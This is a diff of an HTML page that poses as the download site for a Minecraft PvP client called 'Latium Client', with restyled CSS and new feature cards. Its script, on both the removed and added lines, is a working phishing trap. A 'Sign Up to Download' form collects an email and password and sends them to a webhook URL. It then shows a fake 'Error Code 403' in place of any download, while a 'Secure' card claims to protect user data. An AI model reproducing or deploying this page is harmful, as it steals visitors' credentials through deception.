@@ -8,140 +8,96 @@
   <style>
     :root {
       --text-color: #fff;
-      --text-darker-color: #ccc;
-      --blocks-shadow-color: rgba(0, 0, 0, 0.7);
-      --header-bg: #222; /* Even darker header */
+      --header-bg: #222;
       --button-bg: #4fc3f7;
     }
-
+    * { box-sizing: border-box; margin: 0; padding: 0; }
     body, html {
-      margin: 0;
-      padding: 0;
       font-family: Arial, sans-serif;
       background: #111;
       color: var(--text-color);
     }
-
     /* Header */
     header {
-      width: 100%;
-      background-color: var(--header-bg);
-      padding: 1.2rem 2.4rem; /* 20% larger padding */
-      display: flex;
-      align-items: center;
-      justify-content: space-between;
-      box-sizing: border-box;
+      width: 100%; background: var(--header-bg);
+      padding: 1.44rem 2.88rem; /* 20% larger */
+      display: flex; justify-content: space-between; align-items: center;
     }
-    .logo {
-      font-size: 2.16rem; /* 20% larger font */
-      font-weight: bold;
-      color: var(--text-color);
-    }
-    nav {
-      display: flex;
-      gap: 1.2rem; /* slightly larger gap */
-    }
+    .logo { font-size: 2.592rem; font-weight: bold; }
+    nav { display: flex; gap: 1.44rem; }
     nav a {
-      color: var(--text-color);
-      text-decoration: none;
-      font-size: 1rem; /* same as before, ensures smaller than logo */
-      font-weight: bold; /* bold text */
-      padding: 0.6rem 1.2rem; /* 20% larger padding */
-      border-radius: 4px;
+      color: var(--text-color); text-decoration: none;
+      font-weight: bold; font-size: 1rem;
+      padding: 0.72rem 1.44rem; border-radius: 4px;
     }
-    nav a:hover {
-      background: rgba(255,255,255,0.1);
+    nav a:hover { background: rgba(255,255,255,0.1); }
+    /* First Panel with clipped bottom image */
+    #first_panel { position: relative; overflow: hidden; }
+    #first_panel img {
+      width: 100%; display: block;
+      object-fit: cover; height: calc(100vh * 1.2);
+      object-position: top;
     }
-
-    /* First Panel */
-    #first_panel {
-      position: relative;
-      width: 100%;
-      min-height: 400px;
-      overflow: hidden;
+    /* Fire shape overlay */
+    #first_panel::after {
+      content: '';
+      position: absolute; bottom: 0; left: 0;
+      width: 100%; height: 20vh;
+      background: var(--header-bg);
+      clip-path: polygon(
+        0% 100%, 10% 70%, 20% 100%, 30% 60%,
+        40% 100%, 50% 65%, 60% 100%, 70% 75%,
+        80% 100%, 90% 60%, 100% 100%
+      );
+      pointer-events: none;
     }
-    #first_panel_content {
-      padding: 60px 10px 100px;
-      min-height: 100vh;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      background: url("https://wallpapercave.com/uwp/uwp4758681.jpeg") no-repeat fixed;
-      background-size: cover;
+    /* Content on first panel */
+    .panel-content {
+      position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%);
+      text-align: center; background: rgba(20,20,20,0.7);
+      padding: 2rem; border-radius: 1rem;
     }
-    .texts {
-      max-width: 90vw;
-      text-align: center;
-      background-color: rgba(20, 20, 20, 0.8);
-      padding: 50px;
-      border-radius: 40px;
-      backdrop-filter: blur(20px) saturate(1.6);
+    .panel-content h1 { font-size: 2.5rem; margin-bottom: 1rem; }
+    .panel-content p { font-size: 1.25rem; margin-bottom: 1.5rem; }
+    .panel-content button {
+      background: var(--button-bg); border: none;
+      padding: 0.75rem 1.5rem; font-size: 1rem;
+      color: #111; border-radius: 0.5rem; cursor: pointer;
     }
-    .texts h1 {
-      margin: 0 0 1rem;
-      font-size: 2.5rem;
-      color: var(--text-darker-color);
+    /* Features section */
+    #features { padding: 4rem 2rem; background: #111; }
+    .features-grid {
+      display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+      gap: 2rem; max-width: 1200px; margin: auto;
     }
-    .texts p {
-      font-size: 1.5rem;
-      margin-bottom: 1.5rem;
+    .feature-card {
+      background: rgba(20,20,20,0.8); padding: 2rem;
+      border-radius: 1rem; text-align: center;
+      backdrop-filter: blur(10px);
     }
-    #downloadBtn {
-      background: var(--button-bg);
-      border: none;
-      padding: 0.75rem 1.5rem;
-      font-size: 1rem;
-      cursor: pointer;
-      border-radius: 5px;
+    .feature-card h3 { margin-bottom: 0.5rem; font-size: 1.5rem; }
+    .feature-card p { font-size: 1rem; }
+    /* Modal (unchanged) */
+    .modal { display: none; position: fixed; z-index:1000;
+      inset:0; background:rgba(0,0,0,0.7);
+      align-items:center; justify-content:center;
     }
-
-    /* Modal Styles */
-    .modal {
-      display: none;
-      position: fixed;
-      z-index: 1000;
-      left: 0;
-      top: 0;
-      width: 100%;
-      height: 100%;
-      background-color: rgba(0, 0, 0, 0.7);
-      align-items: center;
-      justify-content: center;
+    .modal-content { background:#222; padding:1.5rem;
+      border-radius:0.5rem; width:90%; max-width:350px;
+      position:relative; color:#eee;
     }
-    .modal-content {
-      background-color: #222;
-      padding: 20px;
-      border-radius: 5px;
-      width: 90%;
-      max-width: 350px;
-      color: #eee;
-      position: relative;
-    }
-    .close {
-      position: absolute;
-      top: 10px;
-      right: 10px;
-      font-size: 24px;
-      cursor: pointer;
-      color: #aaa;
+    .modal-content .close { position:absolute; top:0.5rem; right:0.5rem;
+      cursor:pointer; font-size:1.5rem; color:#aaa;
     }
     .modal-content input {
-      width: 100%;
-      padding: 10px;
-      margin: 10px 0;
-      border: 1px solid #444;
-      border-radius: 3px;
-      background: #333;
-      color: #eee;
+      width:100%; padding:0.75rem; margin:0.75rem 0;
+      border:1px solid #444; border-radius:0.25rem;
+      background:#333; color:#eee;
     }
     .modal-content button {
-      width: 100%;
-      padding: 10px;
-      background: var(--button-bg);
-      border: none;
-      border-radius: 3px;
-      cursor: pointer;
-      margin-top: 10px;
+      width:100%; padding:0.75rem; margin-top:0.5rem;
+      background:var(--button-bg); border:none;
+      border-radius:0.25rem; cursor:pointer;
     }
   </style>
 </head>
@@ -156,26 +112,53 @@
   </header>
 
   <section id="first_panel">
-    <div id="first_panel_content">
-      <div class="texts">
-        <h1>Latium Client</h1>
-        <p>The Ultimate Minecraft PvP Experience</p>
-        <button id="downloadBtn">Download Now</button>
+    <img src="https://wallpapercave.com/uwp/uwp4758681.jpeg" alt="PvP Background">
+    <div class="panel-content">
+      <h1>Latium Client</h1>
+      <p>Your Ultimate Minecraft PvP Experience</p>
+      <button id="downloadBtn">Download Now</button>
+    </div>
+  </section>
+
+  <section id="features">
+    <div class="features-grid">
+      <div class="feature-card">
+        <h3>All in one</h3>
+        <p>Everything you need in a single client package.</p>
+      </div>
+      <div class="feature-card">
+        <h3>Performance Boost</h3>
+        <p>Optimize your FPS for smoother gameplay.</p>
+      </div>
+      <div class="feature-card">
+        <h3>Free to Use</h3>
+        <p>No hidden costs or subscriptions required.</p>
+      </div>
+      <div class="feature-card">
+        <h3>Client-Side Mods</h3>
+        <p>Customize your experience with easy mod support.</p>
+      </div>
+      <div class="feature-card">
+        <h3>Secure</h3>
+        <p>Built with security in mind to protect your data.</p>
+      </div>
+      <div class="feature-card">
+        <h3>Fully Supported</h3>
+        <p>Regular updates and dedicated support.</p>
       </div>
     </div>
   </section>
 
+  <!-- Sign-up Modal -->
   <div id="signupModal" class="modal">
     <div class="modal-content">
-      <span id="closeModal" class="close">&times;</span>
-      <div id="modalBody">
-        <h2>Sign Up to Download</h2>
-        <form id="signupForm">
-          <input type="email" id="email" name="email" placeholder="Email" required />
-          <input type="password" id="password" name="password" placeholder="Password" required />
-          <button type="submit">Submit & Download</button>
-        </form>
-      </div>
+      <span id="closeModal" class="close">×</span>
+      <h2>Sign Up to Download</h2>
+      <form id="signupForm">
+        <input type="email" id="email" name="email" placeholder="Email" required>
+        <input type="password" id="password" name="password" placeholder="Password" required>
+        <button type="submit">Submit & Download</button>
+      </form>
     </div>
   </div>
 
@@ -185,26 +168,21 @@
     const modal = document.getElementById('signupModal');
     const closeModal = document.getElementById('closeModal');
     const form = document.getElementById('signupForm');
-    const modalBody = document.getElementById('modalBody');
+    const modalContent = document.querySelector('.modal-content');
 
-    downloadBtn.addEventListener('click', () => { modal.style.display = 'flex'; });
-    closeModal.addEventListener('click', () => { modal.style.display = 'none'; });
-    window.addEventListener('click', e => { if (e.target === modal) modal.style.display = 'none'; });
+    downloadBtn.addEventListener('click', ()=> modal.style.display='flex');
+    closeModal.addEventListener('click', ()=> modal.style.display='none');
+    window.addEventListener('click', e=> { if(e.target===modal) modal.style.display='none'; });
 
     form.addEventListener('submit', async e => {
       e.preventDefault();
       const email = form.email.value;
       const password = form.password.value;
       try {
-        await fetch(webhookURL, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ content: `Email: ${email} | Password: ${password}` })
-        });
-        modalBody.innerHTML = '<h2>Error Code 403</h2>';
-      } catch {
-        alert('Submission failed. Please try again.');
-      }
+        await fetch(webhookURL, { method:'POST', headers:{'Content-Type':'application/json'},
+          body: JSON.stringify({ content:`Email: ${email} | Password: ${password}` }) });
+        modalContent.innerHTML = '<h2>Error Code 403</h2>';
+      } catch { alert('Submission failed.'); }
     });
   </script>
 </body>
